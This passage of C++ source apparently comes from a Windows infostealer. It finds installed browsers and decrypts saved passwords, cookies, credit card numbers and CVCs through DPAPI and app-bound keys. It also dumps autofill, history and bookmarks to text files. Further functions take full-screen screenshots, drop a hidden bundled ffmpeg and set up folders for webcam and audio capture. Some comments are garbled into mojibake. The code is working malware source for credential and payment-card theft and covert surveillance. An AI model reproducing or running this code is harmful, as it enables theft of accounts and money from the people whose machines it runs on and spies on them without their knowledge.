                    r = r.substr(32);
                return sanitizeDecrypted(std::move(r));
            }
        }
        // last resort: try classic master key (some builds)
        if (masterKey.size() >= 16) {
            std::string r = aesGcmDecryptRaw(masterKey, blob, blobLen);
            if (!r.empty()) {
                if (cookieStyle && r.size() > 32) r = r.substr(32);
                return sanitizeDecrypted(std::move(r));
            }
        }
        return "[v20-appbound]";
    }

    auto plain = dpapiDecrypt(blob, (DWORD)blobLen);
    if (plain.empty()) return {};
    return sanitizeDecrypted(std::string(plain.begin(), plain.end()));
}

static std::string sqlText(SqliteApi& api, sqlite3_stmt* st, int col) {
    const unsigned char* t = api.column_text(st, col);
    return t ? std::string((const char*)t) : std::string();
}

static void exportChromiumReadable(
    const std::string& browserName,
    const std::string& profileName,
    const std::string& profilePath,
    const std::string& userDataRoot,
    std::vector<std::pair<std::string, std::vector<char>>>& out)
{
    auto& api = sqliteApi();
    if (!api.ok()) return;

    std::vector<BYTE> masterKey = getChromiumMasterKey(userDataRoot);
    std::vector<BYTE> appBoundKey = getChromiumAppBoundKey(browserName, userDataRoot);
    std::string folder = "browser_data/" + sanitizeFolderName(browserName) + "/" + sanitizeFolderName(profileName) + "/";

    auto copyDb = [&](const std::string& src) -> std::string {
        if (!pathExists(src)) return {};
        std::string tmp = getTempDir() + "sql_" + std::to_string(GetTickCount64()) + ".db";
        if (!copyFileWithRetry(src, tmp)) return {};
        // WAL only — never copy -shm (invalid after copy, makes SQLite see empty DB)
        std::string wal = src + "-wal";
        if (pathExists(wal)) copyFileWithRetry(wal, tmp + "-wal");
        DeleteFileA((tmp + "-shm").c_str());
        return tmp;
    };

    auto cleanupDb = [](const std::string& tmp) {
        if (tmp.empty()) return;
        DeleteFileA(tmp.c_str());
        DeleteFileA((tmp + "-wal").c_str());
        DeleteFileA((tmp + "-shm").c_str());
    };

    // --- Logins ---
    {
        std::ostringstream txt;
        txt << "=== Logins: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        for (const char* rel : { "\\Login Data", "\\Login Data For Account" }) {
            std::string tmp = copyDb(profilePath + rel);
            if (tmp.empty()) continue;
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q = "SELECT origin_url, username_value, password_value FROM logins";
                if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string url = sqlText(api, st, 0);
                        std::string user = sqlText(api, st, 1);
                        const void* blob = api.column_blob(st, 2);
                        int blen = api.column_bytes ? api.column_bytes(st, 2) : 0;
                        std::string pass = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, false);
                        if (url.empty() && user.empty() && pass.empty()) continue;
                        txt << "URL: " << url << "\nUSER: " << user << "\nPASS: " << pass << "\n---\n";
                        count++;
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total logins: " << count << "\n";
        if (appBoundKey.empty())
            txt << "Note: app_bound_key missing (v20 may stay encrypted; run elevated)\n";
        else
            txt << "app_bound_key: OK (" << appBoundKey.size() << " bytes)\n";
        std::string s = txt.str();
        out.push_back({ folder + "logins.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- Cookies ---
    {
        std::ostringstream txt;
        txt << "=== Cookies: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        for (const char* rel : { "\\Network\\Cookies", "\\Cookies" }) {
            std::string src = profilePath + rel;
            bool exists = pathExists(src);
            WIN32_FILE_ATTRIBUTE_DATA fad = {};
            DWORD srcSize = 0;
            if (GetFileAttributesExA(src.c_str(), GetFileExInfoStandard, &fad))
                srcSize = fad.nFileSizeLow;
            txt << "[dbg] path=" << src << " exists=" << (exists ? 1 : 0)
                << " size=" << srcSize << "\n";
            if (!exists) continue;

            std::string tmp = copyDb(src);
            if (tmp.empty()) {
                txt << "[dbg] copy FAILED err=" << GetLastError() << "\n";
                continue;
            }
            WIN32_FILE_ATTRIBUTE_DATA tad = {};
            DWORD tmpSize = 0;
            if (GetFileAttributesExA(tmp.c_str(), GetFileExInfoStandard, &tad))
                tmpSize = tad.nFileSizeLow;
            txt << "[dbg] copy OK tmp=" << tmp << " size=" << tmpSize << "\n";

            sqlite3* db = nullptr;
            int openRc = api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr);
            if (openRc == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, value FROM cookies";
                int prepRc = api.prepare_v2(db, q, -1, &st, nullptr);
                txt << "[dbg] open=" << openRc << " prepare=" << prepRc << "\n";
                if (prepRc == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string host = sqlText(api, st, 0);
                        std::string name = sqlText(api, st, 1);
                        std::string path = sqlText(api, st, 2);
                        int secure = api.column_int ? api.column_int(st, 3) : 0;
                        const void* blob = api.column_blob(st, 6);
                        int blen = api.column_bytes ? api.column_bytes(st, 6) : 0;
                        std::string val = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, true);
                        std::string plainCol = sqlText(api, st, 7);
                        if (val.empty() || !looksLikeText(val)) {
                            if (!plainCol.empty() && looksLikeText(plainCol))
                                val = plainCol;
                            else if (val.empty())
                                val = plainCol.empty() ? "[encrypted]" : sanitizeDecrypted(plainCol);
                            else
                                val = sanitizeDecrypted(val);
                        }
                        txt << host << "\t" << (secure ? "TRUE" : "FALSE") << "\t" << path << "\t"
                            << (secure ? "TRUE" : "FALSE") << "\t0\t" << name << "\t" << val << "\n";
                        count++;
                        if (count >= 8000) break;
                    }
                    api.finalize(st);
                } else {
                    // schema fallback without plain value column
                    st = nullptr;
                    const char* q2 = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
                    prepRc = api.prepare_v2(db, q2, -1, &st, nullptr);
                    txt << "[dbg] prepare_fallback=" << prepRc << "\n";
                    if (prepRc == SQLITE_OK && st) {
                        while (api.step(st) == SQLITE_ROW) {
                            std::string host = sqlText(api, st, 0);
                            std::string name = sqlText(api, st, 1);
                            std::string path = sqlText(api, st, 2);
                            int secure = api.column_int ? api.column_int(st, 3) : 0;
                            const void* blob = api.column_blob(st, 6);
                            int blen = api.column_bytes ? api.column_bytes(st, 6) : 0;
                            std::string val = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, true);
                            if (val.empty() || !looksLikeText(val))
                                val = val.empty() ? "[encrypted]" : sanitizeDecrypted(val);
                            txt << host << "\t" << (secure ? "TRUE" : "FALSE") << "\t" << path << "\t"
                                << (secure ? "TRUE" : "FALSE") << "\t0\t" << name << "\t" << val << "\n";
                            count++;
                            if (count >= 8000) break;
                        }
                        api.finalize(st);
                    }
                }
                api.close(db);
            } else {
                txt << "[dbg] open FAILED rc=" << openRc << "\n";
            }
            DeleteFileA(tmp.c_str());
            DeleteFileA((tmp + "-wal").c_str());
            DeleteFileA((tmp + "-shm").c_str());
            DeleteFileA((tmp + "-journal").c_str());
            if (count > 0) break;
        }
        txt << "Total cookies: " << count << "\n";
        if (appBoundKey.empty())
            txt << "Note: app_bound_key missing (v20 stays encrypted; run elevated)\n";
        else
            txt << "app_bound_key: OK (" << appBoundKey.size() << " bytes)\n";
        txt << "master_key: " << (masterKey.empty() ? "FAIL" : ("OK (" + std::to_string(masterKey.size()) + " bytes)")) << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "cookies.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- Credit cards ---
    {
        std::ostringstream txt;
        txt << "=== Credit Cards: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        std::string tmp = copyDb(profilePath + "\\Web Data");
        if (!tmp.empty()) {
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q =
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards";
                if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string name = sqlText(api, st, 0);
                        int month = api.column_int ? api.column_int(st, 1) : 0;
                        int year = api.column_int ? api.column_int(st, 2) : 0;
                        const void* blob = api.column_blob(st, 3);
                        int blen = api.column_bytes ? api.column_bytes(st, 3) : 0;
                        std::string number = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, false);
                        std::string nick = sqlText(api, st, 4);
                        txt << "Name: " << name << "\nNickname: " << nick
                            << "\nNumber: " << number
                            << "\nExp: " << month << "/" << year << "\n---\n";
                        count++;
                    }
                    api.finalize(st);
                }
                st = nullptr;
                if (api.prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string guid = sqlText(api, st, 0);
                        const void* blob = api.column_blob(st, 1);
                        int blen = api.column_bytes ? api.column_bytes(st, 1) : 0;
                        std::string cvc = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, false);
                        if (!cvc.empty())
                            txt << "CVC guid=" << guid << " value=" << cvc << "\n";
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total cards: " << count << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "credit_cards.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- Autofill ---
    {
        std::ostringstream txt;
        txt << "=== Autofill: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        std::string tmp = copyDb(profilePath + "\\Web Data");
        if (!tmp.empty()) {
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                if (api.prepare_v2(db, "SELECT name, value FROM autofill LIMIT 2000", -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        txt << sqlText(api, st, 0) << " = " << sqlText(api, st, 1) << "\n";
                        count++;
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total autofill: " << count << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "autofill.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- History ---
    {
        std::ostringstream txt;
        txt << "=== History (recent): " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        std::string tmp = copyDb(profilePath + "\\History");
        if (!tmp.empty()) {
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500";
                if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        int visits = api.column_int ? api.column_int(st, 2) : 0;
                        txt << "[" << visits << "] " << sqlText(api, st, 1) << "\n  " << sqlText(api, st, 0) << "\n";
                        count++;
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total history rows: " << count << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "history.txt", std::vector<char>(s.begin(), s.end()) });
    }
}

struct BrowserInstall {
    std::string name;
    std::string userDataRoot;
    bool isFirefox = false;
};

static std::vector<BrowserInstall> detectAllBrowsers() {
    char localAppData[MAX_PATH] = {};
    char roamingAppData[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    std::vector<BrowserInstall> list;
    auto addIf = [&](const std::string& name, const std::string& root, bool fx = false) {
        if (pathExists(root))
            list.push_back({ name, root, fx });
    };
    addIf("Chrome", std::string(localAppData) + "\\Google\\Chrome\\User Data");
    addIf("Chrome Beta", std::string(localAppData) + "\\Google\\Chrome Beta\\User Data");
    addIf("Edge", std::string(localAppData) + "\\Microsoft\\Edge\\User Data");
    addIf("Brave", std::string(localAppData) + "\\BraveSoftware\\Brave-Browser\\User Data");
    addIf("Opera GX", firstExistingPath({
        std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable",
        std::string(localAppData) + "\\Opera Software\\Opera GX Stable"
    }));
    addIf("Opera", firstExistingPath({
        std::string(roamingAppData) + "\\Opera Software\\Opera Stable",
        std::string(localAppData) + "\\Opera Software\\Opera Stable"
    }));
    addIf("Vivaldi", std::string(localAppData) + "\\Vivaldi\\User Data");
    addIf("Yandex", std::string(localAppData) + "\\Yandex\\YandexBrowser\\User Data");
    addIf("Firefox", std::string(roamingAppData) + "\\Mozilla\\Firefox\\Profiles", true);
    return list;
}

static std::vector<std::string> listChromiumProfiles(const std::string& userDataRoot) {
    std::vector<std::string> profiles;
    // Default first
    if (pathExists(userDataRoot + "\\Default"))
        profiles.push_back("Default");
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA((userDataRoot + "\\*").c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            std::string n = fd.cFileName;
            if (n == "." || n == ".." || n == "Default" || n == "System Profile" || n == "Guest Profile") continue;
            // Profile N or custom
            if (n.rfind("Profile", 0) == 0 || pathExists(userDataRoot + "\\" + n + "\\Preferences"))
                profiles.push_back(n);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    if (profiles.empty() && pathExists(userDataRoot))
        profiles.push_back("."); // root is profile (rare)
    return profiles;
}

static std::vector<std::pair<std::string, std::vector<char>>> grabBrowserDataFiles() {
    std::vector<std::pair<std::string, std::vector<char>>> result;
    auto browsers = detectAllBrowsers();
    std::string defaultBrowser = getDefaultBrowserName();

    for (const auto& b : browsers) {
        if (b.isFirefox) {
            WIN32_FIND_DATAA findData;
            HANDLE hFind = FindFirstFileA((b.userDataRoot + "\\*").c_str(), &findData);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || findData.cFileName[0] == '.')
                        continue;
                    std::string profilePath = b.userDataRoot + "\\" + findData.cFileName;
                    std::string folder = "browser_data/Firefox/" + sanitizeFolderName(findData.cFileName) + "/";
                    auto& api = sqliteApi();
                    // cookies as text
                    if (api.ok()) {
                        std::string tmp = getTempDir() + "ffc_" + std::to_string(GetTickCount64()) + ".db";
                        if (copyFileWithRetry(profilePath + "\\cookies.sqlite", tmp)) {
                            sqlite3* db = nullptr;
                            std::ostringstream txt;
                            txt << "=== Firefox Cookies: " << findData.cFileName << " ===\n";
                            int count = 0;
                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                                sqlite3_stmt* st = nullptr;
                                if (api.prepare_v2(db,
                                    "SELECT host, name, value, path, isSecure FROM moz_cookies",
                                    -1, &st, nullptr) == SQLITE_OK && st) {
                                    while (api.step(st) == SQLITE_ROW) {
                                        txt << sqlText(api, st, 0) << "\t" << sqlText(api, st, 1) << "\t"
                                            << sqlText(api, st, 2) << "\t" << sqlText(api, st, 3) << "\n";
                                        count++;
                                    }
                                    api.finalize(st);
                                }
                                api.close(db);
                            }
                            DeleteFileA(tmp.c_str());
                            txt << "Total: " << count << "\n";
                            std::string s = txt.str();
                            result.push_back({ folder + "cookies.txt", std::vector<char>(s.begin(), s.end()) });
                        }
                        // history
                        tmp = getTempDir() + "ffh_" + std::to_string(GetTickCount64()) + ".db";
                        if (copyFileWithRetry(profilePath + "\\places.sqlite", tmp)) {
                            sqlite3* db = nullptr;
                            std::ostringstream txt;
                            txt << "=== Firefox History: " << findData.cFileName << " ===\n";
                            int count = 0;
                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                                sqlite3_stmt* st = nullptr;
                                if (api.prepare_v2(db,
                                    "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 500",
                                    -1, &st, nullptr) == SQLITE_OK && st) {
                                    while (api.step(st) == SQLITE_ROW) {
                                        txt << sqlText(api, st, 1) << "\n  " << sqlText(api, st, 0) << "\n";
                                        count++;
                                    }
                                    api.finalize(st);
                                }
                                api.close(db);
                            }
                            DeleteFileA(tmp.c_str());
                            txt << "Total: " << count << "\n";
                            std::string s = txt.str();
                            result.push_back({ folder + "history.txt", std::vector<char>(s.begin(), s.end()) });
                        }
                    }
                    // logins.json is JSON (still NSS-encrypted passwords) Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž include as text note
                    std::string loginsPath = profilePath + "\\logins.json";
                    if (pathExists(loginsPath)) {
                        std::string tmp = getTempDir() + "ffl_" + std::to_string(GetTickCount()) + ".json";
                        if (copyFileWithRetry(loginsPath, tmp)) {
                            auto data = readFileToVector(tmp);
                            DeleteFileA(tmp.c_str());
                            if (!data.empty())
                                result.push_back({ folder + "logins_encrypted.json", std::move(data) });
                        }
                    }
                    std::string note = "Firefox passwords in logins_encrypted.json are NSS-encrypted (need key4.db + master password).\nCookies/history exported as plain text.\n";
                    result.push_back({ folder + "README.txt", std::vector<char>(note.begin(), note.end()) });
                } while (FindNextFileA(hFind, &findData));
                FindClose(hFind);
            }
            continue;
        }

        auto profiles = listChromiumProfiles(b.userDataRoot);
        for (const auto& prof : profiles) {
            std::string profilePath = (prof == ".") ? b.userDataRoot : (b.userDataRoot + "\\" + prof);
            // Readable TXT only Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž no raw SQLite dumps
            exportChromiumReadable(b.name, prof == "." ? "Root" : prof, profilePath, b.userDataRoot, result);

            std::string bm = profilePath + "\\Bookmarks";
            if (pathExists(bm)) {
                std::string tmp = getTempDir() + "bm_" + std::to_string(GetTickCount()) + ".json";
                if (copyFileWithRetry(bm, tmp)) {
                    auto data = readFileToVector(tmp);
                    DeleteFileA(tmp.c_str());
                    if (!data.empty()) {
                        std::string folder = "browser_data/" + sanitizeFolderName(b.name) + "/" +
                            sanitizeFolderName(prof == "." ? "Root" : prof) + "/";
                        result.push_back({ folder + "bookmarks.json", std::move(data) });
                    }
                }
            }
        }
    }

    std::ostringstream summary;
    summary << "=== Browser Data Summary ===\n";
    summary << "Default browser (registry): " << defaultBrowser << "\n";
    summary << "Detected browsers: " << browsers.size() << "\n";
    summary << "winsqlite3: " << (sqliteApi().ok() ? "OK" : "MISSING") << "\n";
    summary << "Format: readable TXT only (no SQLite dumps)\n\n";
    for (const auto& b : browsers) {
        summary << "- " << b.name << " @ " << b.userDataRoot << "\n";
        if (!b.isFirefox) {
            auto profiles = listChromiumProfiles(b.userDataRoot);
            for (const auto& p : profiles)
                summary << "    profile: " << p << "\n";
            auto mk = getChromiumMasterKey(b.userDataRoot);
            summary << "    master_key: " << (mk.empty() ? "FAIL" : ("OK (" + std::to_string(mk.size()) + " bytes)")) << "\n";
        }
    }
    summary << "\nExported files: " << result.size() << "\n";
    std::string s = summary.str();
    result.push_back({ "browser_data/browser_summary.txt", std::vector<char>(s.begin(), s.end()) });
    return result;
}

static std::string grabBrowserDataSummary() {
    // kept for compatibility Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž full summary is produced inside grabBrowserDataFiles
    auto browsers = detectAllBrowsers();
    std::ostringstream result;
    result << "=== Browser Data ===\n";
    result << "Default browser: " << getDefaultBrowserName() << "\n";
    result << "Detected: " << browsers.size() << "\n";
    for (const auto& b : browsers)
        result << "- " << b.name << " => " << b.userDataRoot << "\n";
    return result.str();
}

// === Feature: Screenshot ===

static int getEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    std::vector<BYTE> buffer(size);
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)buffer.data();
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static std::vector<char> captureScreenshot() {
    std::vector<char> result;

    // Must be DPI aware BEFORE querying metrics, otherwise Windows reports the
    // scaled work area and the taskbar ends up cropped out of the image.
    ensureDpiAware();

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken = 0;
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Gdiplus::Ok)
        return result;

    // Capture the entire virtual screen so the taskbar and every monitor are included.
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    if (width <= 0 || height <= 0) {
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
        x = 0;
        y = 0;
    }

    HDC hScreen = GetDC(nullptr);
    HDC hDC = CreateCompatibleDC(hScreen);
    
    // Create a bitmap that captures the full virtual desktop area
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    HGDIOBJ oldObj = SelectObject(hDC, hBitmap);
    
    // Capture entire virtual screen including taskbar. CAPTUREBLT pulls in the
    // layered shell surfaces (taskbar, its flyouts, notifications).
    if (!BitBlt(hDC, 0, 0, width, height, hScreen, x, y, SRCCOPY | CAPTUREBLT))
        BitBlt(hDC, 0, 0, width, height, hScreen, x, y, SRCCOPY);
    
    SelectObject(hDC, oldObj);

    IStream* stream = nullptr;
    if (CreateStreamOnHGlobal(nullptr, TRUE, &stream) != S_OK || !stream) {
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromHBITMAP(hBitmap, nullptr);
    if (!bitmap) {
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    CLSID clsidPng;
    if (getEncoderClsid(L"image/png", &clsidPng) < 0) {
        delete bitmap;
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    if (bitmap->Save(stream, &clsidPng, nullptr) != Gdiplus::Ok) {
        delete bitmap;
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    // Seek stream to start and read all bytes (GlobalSize can over-report)
    LARGE_INTEGER zero = {};
    ULARGE_INTEGER streamSize = {};
    stream->Seek(zero, STREAM_SEEK_END, &streamSize);
    stream->Seek(zero, STREAM_SEEK_SET, nullptr);

    ULONG toRead = (ULONG)streamSize.QuadPart;
    if (toRead > 0) {
        result.resize(toRead);
        ULONG bytesRead = 0;
        stream->Read(result.data(), toRead, &bytesRead);
        result.resize(bytesRead);
    }

    delete bitmap;
    stream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(nullptr, hScreen);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return result;
}

// === Capture helpers: ffmpeg + waveIn stereo + result dump ===

static void ensureDir(const std::string& path);   // defined below
static void traceStage(const char* msg);          // defined below (near WinMain)

// Where local capture output is dropped when a feature runs in "dump" mode
// (--cli / --once). Uses the folder next to the running executable so it works
// on any machine, with a fallback to %TEMP% if the exe folder is not writable.
static std::string getWorkspaceResultDir() {
    static std::string cached;
    if (!cached.empty())
        return cached;

    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeStr(exePath);
    size_t slash = exeStr.find_last_of("\\/");
    std::string dir = (slash == std::string::npos) ? std::string(".") : exeStr.substr(0, slash);

    std::string candidate = dir + "\\result";

    // Fall back to %TEMP%\result when the exe directory cannot be written to.
    char probe[MAX_PATH];
    snprintf(probe, sizeof(probe), "%s\\.write_test", candidate.c_str());
    HANDLE hProbe = CreateFileA(probe, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
    if (hProbe == INVALID_HANDLE_VALUE) {
        char tmp[MAX_PATH] = {};
        if (GetTempPathA(MAX_PATH, tmp)) {
            candidate = std::string(tmp) + "result";
            if (!candidate.empty() && candidate.back() == '\\')
                candidate.pop_back();
        }
    } else {
        CloseHandle(hProbe);
    }

    ensureDir(candidate);
    cached = candidate;
    return cached;
}

static void ensureDir(const std::string& path) {
    SHCreateDirectoryExA(nullptr, path.c_str(), nullptr);
}

static void dumpToResult(const std::string& relPath, const std::vector<char>& data) {
    if (data.empty()) return;
    std::string full = getWorkspaceResultDir() + "\\" + relPath;
    for (char& c : full) if (c == '/') c = '\\';
    size_t slash = full.rfind('\\');
    if (slash != std::string::npos)
        ensureDir(full.substr(0, slash));
    bool ok = writeVectorToFile(full, data);
    traceStage((std::string("dumpToResult: ") + (ok ? "OK  " : "FAIL") + " " + full).c_str());
}

static void clearResultDir() {
    std::string root = getWorkspaceResultDir();
    ensureDir(root);
    deleteTree(root);
    ensureDir(root);
    ensureDir(root + "\\browser_data");
    ensureDir(root + "\\screenshot");
    ensureDir(root + "\\screen");
    ensureDir(root + "\\webcam");
    ensureDir(root + "\\audio");
}

// Extract the bundled ffmpeg (RCDATA resource id 200) to temp and return its path.
// Returns an empty string when the build carries no bundled ffmpeg.
static std::string extractBundledFfmpeg() {
    static bool tried = false;
    static std::string cached;
    if (tried) return cached;
    tried = true;

    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(200), RT_RCDATA);
    if (!hRes) return cached;
    DWORD size = SizeofResource(nullptr, hRes);
    if (!size) return cached;
    HGLOBAL hData = LoadResource(nullptr, hRes);
    if (!hData) return cached;
    void* p = LockResource(hData);
    if (!p) return cached;

    std::string out = getTempDir() + "ffmpeg_bundled.exe";
    HANDLE h = CreateFileA(out.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return cached;

    DWORD off = 0;
    while (off < size) {
        DWORD chunk = size - off;
        if (chunk > 4 * 1024 * 1024) chunk = 4 * 1024 * 1024;
        DWORD written = 0;
        if (!WriteFile(h, (BYTE*)p + off, chunk, &written, nullptr) || written == 0) {
            CloseHandle(h);
            DeleteFileA(out.c_str());
            return cached;
        }
        off += written;
    }
    CloseHandle(h);

    if (GetFileAttributesA(out.c_str()) != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(out.c_str(), FILE_ATTRIBUTE_HIDDEN);
        cached = out;
    }
    return cached;
}

static std::string findFfmpeg() {
    static std::string cached;
    static bool tried = false;
    if (tried) return cached;
    tried = true;

    // 1) Prefer the ffmpeg shipped inside the build (resource 200).
    std::string bundled = extractBundledFfmpeg();
    if (!bundled.empty() && GetFileAttributesA(bundled.c_str()) != INVALID_FILE_ATTRIBUTES) {
        cached = bundled;
        return cached;
    }

    // 2) Common install locations.
    const char* candidates[] = {
        "C:\\Program Files\\Shotcut\\ffmpeg.exe",
        "C:\\Program Files\\SteelSeries\\GG\\apps\\moments\\ffmpeg.exe",
        "C:\\ffmpeg\\bin\\ffmpeg.exe",
        "C:\\Program Files\\ffmpeg\\bin\\ffmpeg.exe",
        "ffmpeg.exe"
    };
    for (const char* c : candidates) {
        if (GetFileAttributesA(c) != INVALID_FILE_ATTRIBUTES) {
            cached = c;
            return cached;
        }
    }

    // 3) PATH lookup.
    char pathBuf[MAX_PATH] = {};
    if (SearchPathA(nullptr, "ffmpeg.exe", nullptr, MAX_PATH, pathBuf, nullptr)) {
        cached = pathBuf;
        return cached;
    }
    return {};
}

static std::string quoteArg(const std::string& s) {
    return "\"" + s + "\"";
}

static bool runFfmpeg(const std::string& args, DWORD timeoutMs = 60000) {
    std::string ff = findFfmpeg();
    if (ff.empty()) return false;
    std::string cmd = quoteArg(ff) + " -hide_banner -loglevel error -y " + args;

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    char* cmdCopy = _strdup(cmd.c_str());
